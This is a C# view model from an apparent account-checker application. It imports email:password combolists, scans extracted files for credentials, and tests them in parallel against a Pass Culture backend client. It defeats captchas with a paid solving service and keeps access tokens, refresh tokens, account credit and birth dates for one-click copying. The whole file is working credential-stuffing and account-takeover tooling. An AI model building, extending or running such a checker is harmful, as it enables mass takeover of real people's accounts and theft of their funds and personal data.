using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.IO;
using System.Linq;
using CommunityToolkit.Mvvm.ComponentModel;
using DataVortex.App.Services;
using DataVortex.Core.Abstractions;
using DataVortex.Core.Accounts;
using DataVortex.Core.Extraction;
using DataVortex.Core.Models;
using DataVortex.Core.Passculture;
using System.Threading.Tasks;
using CommunityToolkit.Mvvm.Input;

namespace DataVortex.App.ViewModels;

public sealed partial class AccountsViewModel : ObservableObject
{
    private readonly IStorageService _storage;
    private readonly IUiDispatcher _ui;

    private int _accountCount;
    public int AccountCount
    {
        get => _accountCount;
        set => SetProperty(ref _accountCount, value);
    }

    private int _captchaRequests;
    public int CaptchaRequests
    {
        get => _captchaRequests;
        set => SetProperty(ref _captchaRequests, value);
    }

    private readonly PasscultureClient _passClient;
    private readonly IAccountTestRegistry _accounts;
    private readonly IDialogService _dialogs;
    private readonly TwoCaptchaService _twoCaptcha;

    public AccountsViewModel(IStorageService storage, IUiDispatcher ui, PasscultureClient passClient,
        IAccountTestRegistry accounts, IDialogService dialogs, TwoCaptchaService twoCaptcha)
    {
        _storage = storage;
        _ui = ui;
        _passClient = passClient;
        _accounts = accounts;
        _dialogs = dialogs;
        _twoCaptcha = twoCaptcha;
        CaptchaRequests = _twoCaptcha.RequestCount;
        _twoCaptcha.RequestCountChanged += n => _ui.Post(() => CaptchaRequests = n);
        Refresh();
    }

    private void PopulateFromRegistry()
    {
        // The registry is the single, already-deduplicated source of truth for accounts.
        Accounts.Clear();
        foreach (var e in _accounts.Snapshot())
        {
            // Hide credentials the backend rejected as invalid (HTTP 400).
            if (!e.Result.Success && e.Result.StatusCode == 400) continue;
            Accounts.Add(new CredentialEntry(e.Url, e.Email, e.Password, 0, "",
                Tested: true, TestSuccess: e.Result.Success, TestMessage: e.Result.Message,
                TestedUtc: e.Result.TestedUtc, AccessToken: e.Result.AccessToken, RefreshToken: e.Result.RefreshToken,
                Credit: e.Result.Credit, BirthDate: e.Result.BirthDate, StatusCode: e.Result.StatusCode));
        }
        AccountCount = Accounts.Count;
    }

    private string _captchaToken = "";
    public string CaptchaToken { get => _captchaToken; set => SetProperty(ref _captchaToken, value); }

    private string _statusText = "";
    public string StatusText { get => _statusText; set => SetProperty(ref _statusText, value); }

    public ObservableCollection<CredentialEntry> Accounts { get; } = new();

    [RelayCommand]
    private void CopyAccessToken(CredentialEntry? entry)
    {
        if (entry is null || string.IsNullOrWhiteSpace(entry.AccessToken)) return;
        try { System.Windows.Clipboard.SetText(entry.AccessToken); StatusText = "Access token copied to clipboard."; } catch { }
    }

    [RelayCommand]
    private void CopyRefreshToken(CredentialEntry? entry)
    {
        if (entry is null || string.IsNullOrWhiteSpace(entry.RefreshToken)) return;
        try { System.Windows.Clipboard.SetText(entry.RefreshToken); StatusText = "Refresh token copied to clipboard."; } catch { }
    }

    [RelayCommand]
    private async Task TestAccountsAsync()
    {
        StatusText = "Test des comptes…";
        await Task.Run(async () =>
        {
            try
            {
                // Collect every credential we know about: saved records + a fresh scan of extracted files.
                var creds = new List<CredentialEntry>();
                foreach (var r in _storage.LoadRecords())
                    if (r.Credentials is not null) creds.AddRange(r.Credentials);
                foreach (var path in _storage.EnumerateExtractedFiles(null))
                {
                    try { creds.AddRange(CredentialScanner.ScanFile(path)); } catch { }
                }

                // Deduplicate by NORMALIZED identity (email+password) so the same account is never tested twice.
                var unique = creds
                    .Where(c => !string.IsNullOrWhiteSpace(c.Username) || !string.IsNullOrWhiteSpace(c.Password))
                    .GroupBy(c => AccountKey.Of(c.Username, c.Password))
                    .Select(g => g.First())
                    .ToList();

                if (unique.Count == 0)
                {
                    _ui.Post(() => StatusText = "Aucun compte à tester.");
                    return;
                }

                int sent = 0, alreadyKnown = 0;
                await Parallel.ForEachAsync(unique,
                    new ParallelOptions { MaxDegreeOfParallelism = 10 },
                    async (c, token) =>
                    {
                        if (_accounts.TryGet(c.Username, c.Password, out _)) { Interlocked.Increment(ref alreadyKnown); return; }
                        // The registry reserves atomically before any backend call → no duplicate captcha.
                        await AccountTester.TestOnceAsync(_passClient, _accounts, c, token);
                        Interlocked.Increment(ref sent);
                    });

                _ui.Post(() =>
                {
                    StatusText = $"Terminé : {unique.Count} compte(s) unique(s) — {sent} envoyé(s) au backend, {alreadyKnown} déjà connu(s).";
                    Refresh();
                });
            }
            catch (Exception ex)
            {
                _ui.Post(() => StatusText = ex.Message);
            }
        });
    }

    /// <summary>Imports a mail:pass combolist (.txt) and sends every unique, not-yet-known account to the
    /// checker (one captcha each). Reuses the same atomic registry + tester as the rest of the app, so
    /// duplicates across the combolist, saved records and previous runs are never re-tested.</summary>
    [RelayCommand]
    private async Task ImportComboListAsync()
    {
        var path = _dialogs.PickFile("Combolist mail:pass (*.txt)|*.txt|Tous les fichiers (*.*)|*.*");
        if (string.IsNullOrEmpty(path)) return;

        StatusText = "Lecture de la combolist…";
        var (unique, malformed) = await Task.Run(() => ParseCombo(path));

        if (unique.Count == 0)
        {
            StatusText = $"Aucune ligne mail:pass valide trouvée ({malformed} ligne(s) ignorée(s)).";
            return;
        }

        if (!_dialogs.Confirm(
                $"Envoyer {unique.Count} compte(s) unique(s) au checker ?\nChaque test non déjà connu consomme un captcha.",
                "Importer une combolist"))
        {
            StatusText = "Import annulé.";
            return;
        }

        await Task.Run(async () =>
        {
            try
            {
                int sent = 0, alreadyKnown = 0, done = 0;
                await Parallel.ForEachAsync(unique,
                    new ParallelOptions { MaxDegreeOfParallelism = 10 },
                    async (c, token) =>
                    {
                        if (_accounts.TryGet(c.Username, c.Password, out _)) Interlocked.Increment(ref alreadyKnown);
                        else { await AccountTester.TestOnceAsync(_passClient, _accounts, c, token); Interlocked.Increment(ref sent); }

                        int d = Interlocked.Increment(ref done);
                        if (d % 5 == 0 || d == unique.Count)
                        {
                            int s = Volatile.Read(ref sent), k = Volatile.Read(ref alreadyKnown);
                            _ui.Post(() =>
                            {
                                StatusText = $"Checker : {d}/{unique.Count} — {s} envoyé(s), {k} déjà connu(s)";
                                Refresh();
                            });
                        }
                    });

                _ui.Post(() =>
                {
                    StatusText = $"Terminé : {unique.Count} compte(s) unique(s) — {sent} envoyé(s), " +
                                 $"{alreadyKnown} déjà connu(s), {malformed} ligne(s) ignorée(s).";
                    Refresh();
                });
            }
            catch (Exception ex)
            {
                _ui.Post(() => StatusText = ex.Message);
            }
        });
    }

    /// <summary>Parses "mail:pass" lines (split on the first ':'), keeps only entries whose left side looks
    /// like an email, and de-duplicates by normalized identity. Returns the unique list + count of skipped lines.</summary>
    private static (List<CredentialEntry> unique, int malformed) ParseCombo(string path)
    {
        var creds = new List<CredentialEntry>();
        int lineNo = 0, malformed = 0;
        foreach (var raw in File.ReadLines(path))
        {
            lineNo++;
            var line = raw.Trim();
            if (line.Length == 0) continue;
            var idx = line.IndexOf(':');
            if (idx <= 0 || idx >= line.Length - 1) { malformed++; continue; }
            var email = line[..idx].Trim();
            var pass = line[(idx + 1)..].Trim();
            if (email.Length == 0 || pass.Length == 0 || !email.Contains('@')) { malformed++; continue; }
            creds.Add(new CredentialEntry(null, email, pass, lineNo, line));
        }

        var unique = creds
            .GroupBy(c => AccountKey.Of(c.Username, c.Password))
            .Select(g => g.First())
            .ToList();
        return (unique, malformed);
    }

    public void Refresh() => _ui.Post(() =>
    {
        try { PopulateFromRegistry(); }
        catch { AccountCount = 0; }
    });
}
